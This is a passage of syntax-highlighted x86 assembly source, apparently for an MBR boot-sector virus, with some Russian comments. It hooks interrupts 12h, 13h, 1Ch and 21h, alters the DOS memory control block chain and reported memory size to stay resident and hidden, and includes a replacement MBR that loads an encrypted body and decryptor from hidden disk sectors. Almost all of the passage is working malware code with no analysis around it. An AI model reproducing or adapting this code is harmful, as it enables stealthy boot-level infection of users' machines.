                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">070h</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; save 0x1Ch</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc0"> </span><span class="sc5">old0x1c</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">070h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc0"> </span><span class="sc5">old0x1c</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
                  </span><span class="sc1">; set corent 0x21h</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">084h</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; save 0x21h</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old0x21hb</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">084h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old0x21hb</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                  </span><span class="sc6">cli</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">048h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">70h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new0x12h</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">048h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hooking0x1C</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">070h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                  </span><span class="sc6">sti</span><span class="sc0">
                  </span><span class="sc1">;----------</span><span class="sc0">
      </span><span class="sc5">jmp2boot</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">07c00h</span><span class="sc0">
</span><span class="sc1">;-----------------------------</span><span class="sc0">
</span><span class="sc1">;#############boot level#################</span><span class="sc0">
</span><span class="sc5">hooking0x21</span><span class="sc4">:</span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">
            </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old0x21hb</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">fintnext</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0"> </span><span class="sc1">;проверка на послед. MCB</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Make_notlast</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fintnext</span><span class="sc0">
</span><span class="sc5">Make_notlast</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">00</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0"> </span><span class="sc1">;делаем не полследним</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">00</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0"> </span><span class="sc1">;last</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc2">08</span><span class="sc0">  </span><span class="sc1">;system</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">03</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;size</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">cli</span><span class="sc0">
              </span><span class="sc1">; ret 1ch</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old0x1c</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">70h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old0x1c</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">70h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc1">; ret 12h</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old12h</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">48h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old12h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">48h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
               </span><span class="sc1">; hook21h</span><span class="sc0">
               </span><span class="sc1">;addrOld21h</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old0x21hb</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">addrOld21h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old0x21hb</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">addrOld21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
               </span><span class="sc6">sti</span><span class="sc0">
               </span><span class="sc6">cli</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">84h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_0x21</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">84h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
               </span><span class="sc6">sti</span><span class="sc0">
              </span><span class="sc1">; hook13h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
               </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Hook_0x13h_inBoot</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">flag1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@e</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
               </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAH</span><span class="sc0">
</span><span class="sc5">old0x21hb</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">End_hooking0x21</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">hooking0x1C</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">flag1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
               </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Skan0x21</span><span class="sc0">
               </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old0x1c</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">Skan0x21</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">084h</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old0x21hb</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Savpoint0x21</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">084h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old0x21hb</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Exit_Not_Chen</span><span class="sc0">
</span><span class="sc5">Savpoint0x21</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">084h</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old0x21hb</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">084h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old0x21hb</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
               </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc2">02</span><span class="sc0">
               </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit_Not_Chen</span><span class="sc0">
               </span><span class="sc6">cli</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">084h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;set to 82h</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">208h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">084h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">208h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">086h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hooking0x21</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">084h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
               </span><span class="sc6">sti</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">flag1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">Exit_Not_Chen</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">
 </span><span class="sc5">old0x1c</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">flag1</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">counter</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">End_hooking0x1C</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">new0x12h</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">pushf</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old12h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">MemLimit</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
      </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">old12h</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">End_new0x12h</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;---  New MBR -----</span><span class="sc0">
</span><span class="sc5">New_MBR</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
     </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">MemLimit</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
     </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
     </span><span class="sc1">;LOAD BADY</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0209h</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
     </span><span class="sc1">;-----------</span><span class="sc0">
     </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
     </span><span class="sc1">;load decriptor</span><span class="sc0">
     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
     </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
     </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">End_New_MBR</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc1">;#######################################</span><span class="sc0">
</span><span class="sc5">Hook_0x13h_inBoot</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">pusha</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Not_find</span><span class="sc0">
</span><span class="sc5">Hook_0x13h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; перехват 13 го</span><span class="sc0">
  </span><span class="sc6">pusha</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
  </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0cde0h</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc5">nextint</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0f000h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0f000h</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI3</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc5">scantt</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0fff0h</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">vse</span><span class="sc0">
